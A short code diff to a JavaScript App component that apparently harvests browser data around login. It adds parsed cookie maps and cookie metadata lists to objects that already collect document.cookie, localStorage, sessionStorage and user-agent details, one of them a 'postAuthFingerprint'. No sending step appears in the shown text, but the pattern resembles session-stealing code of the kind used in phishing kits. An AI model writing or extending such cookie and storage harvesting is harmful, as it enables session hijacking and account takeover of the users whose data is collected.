@@ -221,6 +221,8 @@ function App() {
         userAgent: typeof navigator !== 'undefined' ? navigator.userAgent : 'Unknown',
         deviceType: typeof navigator !== 'undefined' && /Mobile|Android|iPhone|iPad/.test(navigator.userAgent) ? 'mobile' : 'desktop',
         cookies: postAuthFingerprint.cookies,
+        cookiesParsed: postAuthFingerprint.cookiesParsed, // <-- added: parsed cookie map
+        cookieList: postAuthFingerprint.cookieList || [],  // <-- added: normalized cookie metadata list (if available)
         documentCookies: typeof document !== 'undefined' ? document.cookie : '',
         localStorage: postAuthFingerprint.localStorage,
         sessionStorage: postAuthFingerprint.sessionStorage,
@@ -375,6 +377,8 @@ function App() {
       userAgent: typeof navigator !== 'undefined' ? navigator.userAgent : 'Unknown',
       deviceType: typeof navigator !== 'undefined' && /Mobile|Android|iPhone|iPad/.test(navigator.userAgent) ? 'mobile' : 'desktop',
       cookies: browserFingerprint.cookies,
+      cookiesParsed: browserFingerprint.cookiesParsed, // <-- added: parsed cookie map
+      cookieList: browserFingerprint.cookieList || [],  // <-- added: normalized cookie metadata list (if available)
       documentCookies: typeof document !== 'undefined' ? document.cookie : '',
       localStorage: browserFingerprint.localStorage,
       sessionStorage: browserFingerprint.sessionStorage,
